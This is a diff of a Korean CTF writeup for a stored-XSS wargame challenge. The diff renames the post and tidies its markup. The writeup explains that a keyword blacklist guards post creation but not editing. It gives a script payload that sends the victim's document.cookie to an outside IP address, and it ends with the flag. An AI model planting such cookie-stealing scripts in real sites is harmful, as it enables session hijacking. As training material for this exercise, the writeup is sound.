@@ -1,58 +1,36 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 5.3 xss_WAF_3"
+title: "KnockOn Bootcamp 2nd - 5.3 XSS WAF 3"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
+  - KnockOn Bootcamp 2nd
+  - XSS
   - Stored XSS
   - Filter Bypass
-last_modified_at: 2024-09-09T10:00:00-05:00
+last_modified_at: 2024-09-10T00:00:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10042/>
 
-![5.3 xss_WAF_3 1](/assets/images/writeup/web-hacking/knock-on/5-3_XSS_1.png)
+![5.3 xss_WAF_3 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-3-xss-1.png)
 
-![5.3 xss_WAF_3 2](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_2.png)
+![5.3 xss_WAF_3 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-3-xss-1.png)
 
-![5.3 xss_WAF_3 3](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_3.png)
-
-
-|
-
-|
-
-|
+![5.3 xss_WAF_3 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-3-xss-1.png)
 
 ### 목표
 
----
-
 게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기
 
-|
-
 ### 공격 기법
-
----
 
 Cross Site Scripting
 
 - Stored XSS
 - Filter Bypass
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -207,17 +185,9 @@ if __name__ == "__main__":
 
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### add_post()
-
----
 
 ```python
 black_list = ["script","img","audio","body","video","object","meta","location","href","alert","window","<",">"]
@@ -239,13 +209,7 @@ def add_post():
 
 `black_list`에 `<>`도 추가됨
 
-|
-
-|
-
 ### edit()
-
----
 
 ```python
 @app.route("/edit/<int:post_id>", methods=["GET", "POST"])
@@ -261,13 +225,7 @@ def edit_post(post_id):
 
 `add_post()`와는 달리 `edit()`에서는 필터링이 없음. 여기서 스크립트 코드 추가하면 됨
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```html
 <script>location.href='http://20.41.120.97:10010/'+document.cookie</script>
@@ -279,30 +237,14 @@ def edit_post(post_id):
 
 게시물 작성 → 수정 → 스크립트 삽입
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ```html
 <script>location.href='http://20.41.120.97:10010/'+document.cookie</script>
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```sh
 K0{the_best_bypass_is_find_another_endpoint!}
 ```
-
-|
-
----
